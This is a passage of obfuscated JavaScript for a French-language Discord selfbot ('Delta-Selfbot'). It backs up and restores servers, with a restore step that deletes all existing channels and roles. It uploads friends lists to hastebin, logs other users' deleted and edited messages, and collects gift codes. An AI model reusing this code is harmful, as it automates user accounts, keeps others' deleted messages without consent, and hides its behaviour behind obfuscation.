                if(_0xb79699[_0x41737b('0xb7')](message[_0x41737b('0x133')][_0x41737b('0x209')](client[_0x41737b('0xb9')]['id'])[_0x41737b('0x19e')]) > 0x0) return message.edit(_0x45b98e + _0x41737b('0x187')).catch(_0x5abcca => console.log('[', _0x41737b('0xf9')[_0x41737b('0x2ab')], ']', _0x41737b('0xa3')[_0x41737b('0x145')]));
            }), message.edit(_0x21f655 + _0x53081e('0xb6'))[_0x53081e('0x18d')](_0x2afa3c => console.log('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')]))[_0x53081e('0xdb')](_0x2118e6 => {
                const _0x4ecf95 = _0x53081e;
                let _0x4a5d1b = _0x3eb340(0x10);
                const _0x150b4e = message[_0x4ecf95('0x133')][_0x4ecf95('0x19')][_0x4ecf95('0xb8')](function(_0xd1bf05, _0x1793f5) {
                        const _0x3e30ac = _0x4ecf95;
                        return _0xd1bf05.position - _0x1793f5[_0x3e30ac('0xca')];
                    })[_0x4ecf95('0x271')]()['map'](_0x3ecafb => {
                        const _0x1b4945 = _0x4ecf95,
                            _0x361687 = {
                                'type': _0x3ecafb.type,
                                'name': _0x3ecafb.name,
                                'postion': _0x3ecafb[_0x1b4945('0x21e')]
                            };
                        if(_0x3ecafb[_0x1b4945('0x3e')]) _0x361687[_0x1b4945('0x3e')] = _0x3ecafb[_0x1b4945('0x3e')][_0x1b4945('0x10d')];
                        return _0x361687;
                    }),
                    _0x22e9f3 = message[_0x4ecf95('0x133')]['roles'][_0x4ecf95('0x1b6')](_0x44e510 => _0x44e510[_0x4ecf95('0x10d')] !== _0x4ecf95('0x212'))['sort'](function(_0x404af1, _0x82ff9) {
                        const _0x21e71c = _0x4ecf95;
                        return _0x404af1[_0x21e71c('0xca')] - _0x82ff9[_0x21e71c('0xca')];
                    })[_0x4ecf95('0x271')]()[_0x4ecf95('0x25b')](_0x2e2aa9 => {
                        const _0x150d7f = _0x4ecf95,
                            _0x5056b3 = {
                                'name': _0x2e2aa9.name,
                                'color': _0x2e2aa9.color,
                                'hoist': _0x2e2aa9.hoist,
                                'permissions': _0x2e2aa9[_0x150d7f('0x1e8')],
                                'mentionable': _0x2e2aa9.mentionable,
                                'position': _0x2e2aa9[_0x150d7f('0xca')]
                            };
                        return _0x5056b3;
                    });
                if(!backups[message[_0x4ecf95('0x1ab')]['id']]) backups[message[_0x4ecf95('0x1ab')]['id']] = {};
                backups[message[_0x4ecf95('0x1ab')]['id']][_0x4a5d1b] = {
                    'icon': message[_0x4ecf95('0x133')]['iconURL'],
                    'name': message[_0x4ecf95('0x133')][_0x4ecf95('0x10d')],
                    'owner': message[_0x4ecf95('0x133')][_0x4ecf95('0x29c')],
                    'members': message.guild[_0x4ecf95('0x215')],
                    'createdAt': message.guild[_0x4ecf95('0x245')],
                    'roles': _0x22e9f3,
                    'channels': _0x150b4e
                }, _0x1947ac(), console[_0x4ecf95('0x2f')]((_0x4ecf95('0x15a') + message[_0x4ecf95('0x133')][_0x4ecf95('0x10d')] + _0x4ecf95('0xba') + _0x4a5d1b).green), message.edit(_0x21b23e + '  **Info**\x0a\x0aNouvelle backup du serveur **' + message[_0x4ecf95('0x133')]['name'] + '** vien d\x27être crée, voici son id : `' + _0x4a5d1b + _0x4ecf95('0x223') + prefix + _0x4ecf95('0x148'))[_0x4ecf95('0x18d')](_0x4ccea9 => console[_0x4ecf95('0x2f')]('[', 'ERROR' [_0x4ecf95('0x2ab')], ']', _0x4ecf95('0xa3')[_0x4ecf95('0x145')]));
            }), console[_0x53081e('0x2f')](_0x53081e('0x205')[_0x53081e('0x39')]);
        }
        if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0xa6'))) {
            let _0x3ff057 = message[_0x53081e('0x133')];
            if(!_0x3ff057) {
                message.edit(_0x53081e('0x1a8'));
                return;
            }
            let _0x566011 = _0xdcd936[_0x53081e('0xf8')](0x2)['join'](' '),
                _0x3cb31a = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x24b'))
.setFooter(_0x53081e('0x191'))[_0x53081e('0x1f6')]('Tu dois définir ton id de backup... Fais ' + prefix + _0x53081e('0x9d'))[_0x53081e('0x42')](color);
            if(!_0x566011) return message[_0x53081e('0x179')](_0x3cb31a)[_0x53081e('0x18d')](_0x12eb02 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));
            let _0x352271 = new Discord[(_0x53081e('0x226'))]()
                .setTitle(_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1ca')]('Delta-Selfbot')
                .addField('**Tu n\x27a pas de backup avec cette id : ' + _0x566011 + _0x53081e('0x6'), prefix + _0x53081e('0x104'))[_0x53081e('0x42')](color);
            if(!backups[message[_0x53081e('0x1ab')]['id']][_0x566011]) return message[_0x53081e('0x179')](_0x352271)[_0x53081e('0x18d')](_0x3777a3 => console.log('[', 'ERROR' [_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));;
            delete backups[message[_0x53081e('0x1ab')]['id']][_0x566011], _0x1947ac();
            let _0x6ff74e = new Discord[(_0x53081e('0x226'))]()
                .setTitle(_0x5288af + _0x53081e('0x198'))[_0x53081e('0x1ca')](_0x53081e('0x191'))
.setDescription(_0x53081e('0x213'))[_0x53081e('0x42')](color);
            message.edit(_0x6ff74e)[_0x53081e('0x18d')](_0x3c456f => console.log('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', _0x53081e('0xa3')[_0x53081e('0x145')])), console.log(_0x53081e('0x22d')[_0x53081e('0x39')]);
        }
        if(message.content.startsWith(prefix + 'backup load') || message.content.startsWith(prefix + _0x53081e('0x13a'))) {
            let _0x54c0e3 = message[_0x53081e('0x133')];
            if(!_0x54c0e3) {
                message[_0x53081e('0x179')](_0x53081e('0x1a8'));
                return;
            }
            let _0x55bffe = client.emojis[_0x53081e('0x89')]('655704809483141141') || '❌',
                _0x5ead76 = _0xdcd936.splice(0x2)[_0x53081e('0x28d')](' '),
                _0x35896c = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x55bffe + '  Error')[_0x53081e('0x1f6')](_0x53081e('0x27') + prefix + 'help` pour avoir plus d\x27informations');
            if(!_0x5ead76) return message[_0x53081e('0xf2')][_0x53081e('0x20e')](_0x35896c);
            let _0x4133aa = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x55bffe + '  Error')[_0x53081e('0x1cd')](_0x53081e('0x17c') + _0x5ead76 + _0x53081e('0x6'), _0x53081e('0x25'))
.setFooter('Delta-Selfbot')[_0x53081e('0x42')](color);
            if(!backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76]) return message[_0x53081e('0xf2')]['send'](_0x4133aa)[_0x53081e('0x18d')](_0x48f4d9 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9')[_0x53081e('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));
            message.guild[_0x53081e('0x19')][_0x53081e('0x8b')](_0x4a623f => {
                const _0x393284 = _0x53081e;
                _0x4a623f[_0x393284('0x110')](_0x393284('0x173'));
            }), message[_0x53081e('0x133')][_0x53081e('0x33')][_0x53081e('0x1b6')](_0x5e6c2d => _0x5e6c2d[_0x53081e('0x107')][_0x53081e('0xa1')](_0x5d1590 => !_0x5d1590[_0x53081e('0xb9')][_0x53081e('0x280')]))['forEach'](_0x34ec46 => {
                const _0x117973 = _0x53081e;
                _0x34ec46[_0x117973('0x110')](_0x117973('0x173'));
            }), backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x33')]['forEach'](async function(_0x3fcbf6) {
                const _0x1a3250 = _0x53081e;
                message[_0x1a3250('0x133')][_0x1a3250('0x139')]({
                    'name': _0x3fcbf6[_0x1a3250('0x10d')],
                    'color': _0x3fcbf6.color,
                    'permissions': _0x3fcbf6.permissions,
                    'hoist': _0x3fcbf6[_0x1a3250('0x1f2')],
                    'mentionable': _0x3fcbf6[_0x1a3250('0x1d7')],
                    'position': _0x3fcbf6[_0x1a3250('0xca')]
                })[_0x1a3250('0xdb')](_0x438cff => {
                    const _0x436a9d = _0x1a3250;
                    _0x438cff[_0x436a9d('0xf6')](_0x438cff[_0x436a9d('0xca')]);
                });
            }), backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x19')][_0x53081e('0x1b6')](_0x4900ad => _0x4900ad[_0x53081e('0xc6')] === _0x53081e('0x26d'))[_0x53081e('0x8b')](async function(_0x2a986f) {
                const _0x2dc037 = _0x53081e;
                message[_0x2dc037('0x133')][_0x2dc037('0x12')](_0x2a986f[_0x2dc037('0x10d')], {
                    'type': _0x2a986f.type,
                    'permissionOverwrites': _0x2a986f[_0x2dc037('0x1dd')]
                });
            }), backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x19')]['filter'](_0x3a5bd5 => _0x3a5bd5[_0x53081e('0xc6')] !== 'category')[_0x53081e('0x8b')](async function(_0x2b9b1d) {
                const _0x28c44f = _0x53081e;
                message[_0x28c44f('0x133')][_0x28c44f('0x12')](_0x2b9b1d[_0x28c44f('0x10d')], {
                    'type': _0x2b9b1d[_0x28c44f('0xc6')],
                    'permissionOverwrites': _0x2b9b1d[_0x28c44f('0x1dd')]
                })[_0x28c44f('0xdb')](_0xa14213 => {
                    const _0x2c6fb1 = _0x28c44f,
                        _0x2d0f80 = message[_0x2c6fb1('0x133')][_0x2c6fb1('0x19')][_0x2c6fb1('0x1b6')](_0x536cac => _0x536cac[_0x2c6fb1('0xc6')] === _0x2c6fb1('0x26d'))[_0x2c6fb1('0x7c')](_0x2f5472 => _0x2f5472[_0x2c6fb1('0x10d')] === _0x2b9b1d[_0x2c6fb1('0x3e')]);
                    _0x2b9b1d[_0x2c6fb1('0x3e')] ? _0xa14213.setParent(_0x2d0f80) : '';
                });
            }), message.guild[_0x53081e('0x295')](backups[message.author.id][_0x5ead76][_0x53081e('0x10d')]), message[_0x53081e('0x133')][_0x53081e('0x20c')](backups[message[_0x53081e('0x1ab')]['id']][_0x5ead76][_0x53081e('0x108')]), console.log(_0x53081e('0x88')[_0x53081e('0x39')]);
        }
        if(message.content.startsWith(prefix + _0x53081e('0x1ce')) || message.content[_0x53081e('0x64')](prefix + _0x53081e('0x8a'))) {
            let _0x3fcf76 = _0xdcd936.splice(0x2)[_0x53081e('0x28d')](' '),
                _0x54d49b = new Discord.RichEmbed()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1ca')](_0x53081e('0x191'))
.setDescription(_0x53081e('0x27') + prefix + _0x53081e('0x83'))[_0x53081e('0x42')](color);
            if(!_0x3fcf76) return message.edit(_0x54d49b)[_0x53081e('0x18d')](_0x3900f4 => console[_0x53081e('0x2f')]('[', _0x53081e('0xf9').red, ']', _0x53081e('0xa3')[_0x53081e('0x145')]));
            let _0x1fc0f7 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1ca')](_0x53081e('0x191'))[_0x53081e('0x1f6')]('Tu n\x27as pas de **backup** avec cet id `' + _0x3fcf76 + '`.')[_0x53081e('0x42')](color);
            if(!backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76]) return message[_0x53081e('0x179')](_0x1fc0f7);
            try {
                let _0x2a3537 = new Discord[(_0x53081e('0x226'))]()
                    .setTitle(backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x10d')])[_0x53081e('0x15f')](backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76]['icon'])
                    .addField(_0x53081e('0x207'), '<@' + backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x129')] + '>', !![])[_0x53081e('0x1cd')](_0x53081e('0x22a'), backups[message.author.id][_0x3fcf76][_0x53081e('0x107')], !![])[_0x53081e('0x1cd')]('Created At', backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x245')])[_0x53081e('0x1cd')](_0x53081e('0x1c9'), _0x53081e('0x1fb') + backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x19')][_0x53081e('0x25b')](_0x22988c => _0x22988c.name)[_0x53081e('0x28d')]('\x0a') + _0x53081e('0x1fb'), !![])
                    .addField(_0x53081e('0x167'), _0x53081e('0x1fb') + backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x33')][_0x53081e('0x25b')](_0x3a23e2 => _0x3a23e2[_0x53081e('0x10d')])[_0x53081e('0x28d')]('\x0a') + '```', !![]);
                message[_0x53081e('0x179')](_0x2a3537);
            } catch (_0x25aced) {
                hastebins(backups[message[_0x53081e('0x1ab')]['id']][_0x3fcf76][_0x53081e('0x19')]['map'](_0x518610 => _0x518610[_0x53081e('0x10d')])[_0x53081e('0x28d')]('\x0a'), 'txt')[_0x53081e('0xdb')](_0x284a3c => {
                    const _0x20468e = _0x53081e;
                    hastebins(backups[message[_0x20468e('0x1ab')]['id']][_0x3fcf76][_0x20468e('0x33')][_0x20468e('0x25b')](_0x415f78 => _0x415f78[_0x20468e('0x10d')])[_0x20468e('0x28d')]('\x0a'), _0x20468e('0x18c'))[_0x20468e('0xdb')](_0x304302 => {
                        const _0x45a38b = _0x20468e;
                        let _0x5c8385 = new Discord[(_0x45a38b('0x226'))]()[_0x45a38b('0xc9')](backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x10d')])[_0x45a38b('0x15f')](backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x108')])[_0x45a38b('0x1cd')](_0x45a38b('0x207'), '<@' + backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x129')] + '>', !![])[_0x45a38b('0x1cd')]('Members', backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x107')], !![])[_0x45a38b('0x1cd')](_0x45a38b('0x221'), backups[message[_0x45a38b('0x1ab')]['id']][_0x3fcf76][_0x45a38b('0x245')])[_0x45a38b('0x1cd')]('Channels', _0x284a3c, !![])[_0x45a38b('0x1cd')](_0x45a38b('0x167'), _0x304302, !![])
.setFooter(_0x45a38b('0x191'));
                        message[_0x45a38b('0x179')](_0x5c8385)[_0x45a38b('0x18d')](_0x4d2920 => console[_0x45a38b('0x2f')]('[', 'ERROR' [_0x45a38b('0x2ab')], ']', 'une erreur est survenue que je ne peux régler' [_0x45a38b('0x145')]));
                    });
                });
            }
            console[_0x53081e('0x2f')](_0x53081e('0x149')[_0x53081e('0x39')]);
        }
        if(message.content[_0x53081e('0x64')](prefix + _0x53081e('0x277'))) {
            let _0x5e0f89 = new Discord[(_0x53081e('0x226'))]()[_0x53081e('0xc9')](_0x2bf8e9 + _0x53081e('0x1e9'))[_0x53081e('0x1f6')]('Vous n\x27avez pas encore sauvegardé de serveur')[_0x53081e('0x42')](color);
            if(!backups[message[_0x53081e('0x1ab')]['id']]) return message[_0x53081e('0x179')](_0x5e0f89)[_0x53081e('0x18d')](_0x5a6bd2 => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler' [_0x53081e('0x145')]));
            let _0x3d2826 = new Discord.RichEmbed()
                .setTitle(_0x45b98e + '  Warning')[_0x53081e('0x1f6')]('Es-tu sûr de vouloir supprimer toutes tes backups ?\x0a__Cette action est irréversible !__'),
                _0x4b5ef3 = new Discord[(_0x53081e('0x226'))]()
                .setColor(color)[_0x53081e('0xc9')](_0x53081e('0xa0'))
.setFooter(_0x53081e('0x191'))
                .addField(_0x53081e('0x204'), _0x53081e('0xa0'));
            message[_0x53081e('0x179')](_0x4b5ef3).then(() => {
                const _0x405731 = _0x53081e;
                message[_0x405731('0xf2')][_0x405731('0x1d6')](_0x585273 => _0x585273[_0x405731('0x18f')] === _0x405731('0x11a'), {
                    'max': 0x1,
                    'time': 0x7530,
                    'errors': [_0x405731('0x216')]
                })[_0x405731('0xdb')](_0x2b5e36 => {
                    const _0x139f93 = _0x405731;
                    delete backups[message[_0x139f93('0x1ab')]['id']];
                    let _0x26ab6c = new Discord[(_0x139f93('0x226'))]()[_0x139f93('0xc9')](_0x5288af + _0x139f93('0x74'))[_0x139f93('0x1f6')](_0x139f93('0x6b'))
.setFooter(_0x139f93('0x191'))[_0x139f93('0x42')](color);
                    message[_0x139f93('0x179')](_0x26ab6c)[_0x139f93('0x18d')](_0x294f8a => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green)), message[_0x139f93('0x110')](), console.log(_0x139f93('0x12d')[_0x139f93('0x39')]);
                });
            });
        }
        if(message.content === prefix + _0x53081e('0x234')) {
            var _0x57b7c8 = client[_0x53081e('0xb9')]['friends'][_0x53081e('0x1c1')];
            const _0xce165f = client[_0x53081e('0xb9')]['friends'][_0x53081e('0x271')]();
            let _0x33322d = ('Successfully backed up ' + _0xce165f[_0x53081e('0x219')][_0x53081e('0x258')]()[_0x53081e('0x25e')] + _0x53081e('0x91'))[_0x53081e('0x145')];
            console[_0x53081e('0x2f')](_0x33322d), hastebins(_0xce165f + '\x0a')[_0x53081e('0xdb')](_0x24a095 => {
                const _0x3c0e84 = _0x53081e;
                var _0x455179 = new Discord[(_0x3c0e84('0x226'))]()
                    .setTitle('backup friends (<@id>)')[_0x3c0e84('0x1cd')]('```lien hastebins```', _0x24a095)[_0x3c0e84('0x42')](color)[_0x3c0e84('0x1c4')]()[_0x3c0e84('0x1f6')](_0x3c0e84('0x248'));
                message[_0x3c0e84('0x179')](_0x455179)[_0x3c0e84('0x18d')](_0x3e50a7 => console[_0x3c0e84('0x2f')]('[', _0x3c0e84('0xf9')[_0x3c0e84('0x2ab')], ']', _0x3c0e84('0xa3')[_0x3c0e84('0x145')])), console[_0x3c0e84('0x2f')](_0x3c0e84('0x109')[_0x3c0e84('0x39')]);
            });
        }

        function _0x3eb340(_0x29377f) {
            const _0x1d9a30 = _0x53081e;
            var _0x31b76f = '',
                _0x40583b = _0x1d9a30('0x13e'),
                _0x2c66ae = _0x40583b[_0x1d9a30('0x219')];
            for(var _0x3b6c10 = 0x0; _0x3b6c10 < _0x29377f; _0x3b6c10++) {
                _0x31b76f += _0x40583b[_0x1d9a30('0x66')](Math.floor(Math[_0x1d9a30('0x1a1')]() * _0x2c66ae));
            }
            return _0x31b76f;
        }

        function _0x1947ac() {
            const _0x44d726 = _0x53081e;
            fs[_0x44d726('0x73')](_0x44d726('0x1c0'), JSON[_0x44d726('0x236')](backups), _0x3858b2 => {
                const _0x1b5906 = _0x44d726;
                if(_0x3858b2) console[_0x1b5906('0x23e')](_0x3858b2);
            });
        }
    } catch (_0x2fd171) {
        throw _0x2fd171;
    }
}), client.on('messageUpdate', _0x7bf620 => {
    const _0x3959c1 = _0x14ffc7;
    if(_0x7bf620[_0x3959c1('0x1ab')]['id'] === client.user.id) return;
    _0x7bf620[_0x3959c1('0xf2')]['type'] === 'dm' && (console.log(_0x3959c1('0x185')[_0x3959c1('0x153')]), console[_0x3959c1('0x2f')](_0x3959c1('0x26b')[_0x3959c1('0x2ab')]) ^ console[_0x3959c1('0x2f')]('╟─────────────────────────────────╢' [_0x3959c1('0x153')]), console.log((_0x3959c1('0x3d') + _0x7bf620[_0x3959c1('0x1ab')][_0x3959c1('0xd9')] + '\x0a║--> Content: ' + _0x7bf620[_0x3959c1('0x18f')] + _0x3959c1('0x123') + _0x7bf620[_0x3959c1('0x245')]).green), console[_0x3959c1('0x2f')](_0x3959c1('0x22e').blue));
}), client.on('messageDelete', messageDelete => {
    const _0x1b0e2c = _0x14ffc7;
    if(messageDelete[_0x1b0e2c('0x1ab')]['id'] === client.user.id) return;
    messageDelete.channel[_0x1b0e2c('0xc6')] === 'dm' && (console[_0x1b0e2c('0x2f')]('\x0a╔═════════════════════════════════╗' [_0x1b0e2c('0x153')]), console.log(_0x1b0e2c('0x26b')[_0x1b0e2c('0x2ab')]) ^ console.log(_0x1b0e2c('0x8d').blue), console[_0x1b0e2c('0x2f')]((_0x1b0e2c('0x200') + messageDelete[_0x1b0e2c('0x1ab')]['tag'] + _0x1b0e2c('0x201') + messageDelete.content + '\x0a║--> At: ' + messageDelete[_0x1b0e2c('0x245')])[_0x1b0e2c('0x145')]), console.log(_0x1b0e2c('0x22e').blue));
    if(messageDelete[_0x1b0e2c('0x18f')][_0x1b0e2c('0x3b')](_0x1b0e2c('0x212')) || messageDelete[_0x1b0e2c('0x18f')]['includes'](_0x1b0e2c('0xeb'))) {
        if(messageDelete[_0x1b0e2c('0x1ab')]['id'] === client[_0x1b0e2c('0xb9')]['id']) return;
        if(messageDelete[_0x1b0e2c('0xf2')]['type'] === 'dm') return;
        console.log(_0x1b0e2c('0x185')[_0x1b0e2c('0x153')]), console[_0x1b0e2c('0x2f')](_0x1b0e2c('0x26b')[_0x1b0e2c('0x2ab')]) ^ console[_0x1b0e2c('0x2f')](_0x1b0e2c('0x8d').blue), console[_0x1b0e2c('0x2f')]((_0x1b0e2c('0x24') + messageDelete[_0x1b0e2c('0x133')]['name'] + ' \x0a║--> channel: ' + messageDelete[_0x1b0e2c('0xf2')]['name'] + ' \x0a║--> User: ' + messageDelete[_0x1b0e2c('0x1ab')]['tag'] + _0x1b0e2c('0x201') + messageDelete[_0x1b0e2c('0x18f')] + _0x1b0e2c('0x71') + messageDelete[_0x1b0e2c('0x245')])[_0x1b0e2c('0x145')]), console[_0x1b0e2c('0x2f')](_0x1b0e2c('0x22e')[_0x1b0e2c('0x153')]);
    } else return;
});

function matchCode(_0x5e8a3b, _0x27ecc9) {
    const _0x141203 = _0x14ffc7;
    let _0x3f1e07 = _0x5e8a3b[_0x141203('0x119')](/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/);
    if(_0x3f1e07) return _0x27ecc9(_0x3f1e07[0x0]), matchCode(_0x5e8a3b[_0x141203('0x1ed')](_0x3f1e07[_0x141203('0xa5')] + _0x3f1e07[0x0]['length']), _0x27ecc9);
    else _0x27ecc9(null);
}
client.on('message', message => {
    const _0xac3b49 = _0x14ffc7;
    let _0xe10fc0 = [];
    matchCode(message[_0xac3b49('0x18f')], _0x3b126e => {
        const _0x172e8a = _0xac3b49;
        if(!_0x3b126e) return;
        if(!_0xe10fc0.includes(_0x3b126e)) _0xe10fc0[_0x172e8a('0x27d')](_0x3b126e);
    });
}), client.on('guildDelete', _0x1beb57 => {
    const _0x24e86e = _0x14ffc7;
    console.log(_0x24e86e('0x185').blue), console[_0x24e86e('0x2f')](_0x24e86e('0x26b')[_0x24e86e('0x2ab')]) ^ console[_0x24e86e('0x2f')](_0x24e86e('0x1d5')[_0x24e86e('0x153')]), console.log((_0x24e86e('0x81') + _0x1beb57[_0x24e86e('0x10d')])[_0x24e86e('0x145')]), console[_0x24e86e('0x2f')](_0x24e86e('0x22e').blue);
}), client.on('guildCreate', _0x454b2a => {
    const _0x569518 = _0x14ffc7;
    console.log('\x0a╔═════════════════════════════════╗'.blue), console.log(_0x569518('0x26b')[_0x569518('0x2ab')]) ^ console.log(_0x569518('0x1d5')[_0x569518('0x153')]), console.log((_0x569518('0x1ea') + _0x454b2a[_0x569518('0x10d')])[_0x569518('0x145')]), console[_0x569518('0x2f')](_0x569518('0x22e')[_0x569518('0x153')]);
}), client.login(token);